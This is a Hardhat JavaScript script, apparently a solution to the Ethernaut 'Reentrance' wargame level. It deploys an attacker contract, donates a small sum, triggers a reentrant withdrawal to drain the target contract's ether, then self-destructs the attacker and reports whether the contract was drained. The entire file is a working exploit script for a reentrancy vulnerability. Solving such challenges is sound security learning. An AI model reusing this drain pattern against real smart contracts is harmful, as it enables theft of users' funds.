const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let owner, tx, res, bal
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0xb679fE929f642C10243516f1BF5A4050f64C7235"
    let target = await ethers.getContractAt("Reentrance", instanceAddress)
    let attackerContractFactory = await ethers.getContractFactory(
        "ReentranceAttacker"
    )
    let attackerContract = await attackerContractFactory.deploy(instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    console.log(`Attacker Contract deployed at ${attackerContract.address}`)

    // Attack
    bal = await ethers.provider.getBalance(target.address)
    console.log(
        `Initial target balance: ${ethers.utils.formatEther(
            bal.toString()
        )} ETH`
    )

    tx = await attackerContract.donate({
        value: ethers.utils.parseEther("0.0001"),
    })
    await tx.wait(1)
    bal = ethers.utils.formatEther(
        (await target.balanceOf(attackerContract.address)).toString()
    )
    console.log(`Current attacker balance in target: ${bal} ETH`)
    tx = await attackerContract.attack({ gasLimit: 200000 })
    await tx.wait(1)
    bal = await ethers.provider.getBalance(target.address)
    console.log(
        `Final target balance: ${ethers.utils.formatEther(bal.toString())} ETH`
    )
    tx = await attackerContract.kill()
    await tx.wait(1)

    // Check
    bal = await ethers.provider.getBalance(target.address)
    if (parseInt(bal.toString()) == 0) {
        console.log(`${symbols.success} Contract drained!`)
    } else {
        console.log(
            `${
                symbols.error
            } Contract still has balance of ${ethers.utils.formatEther(
                bal.toString()
            )} wei`
        )
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
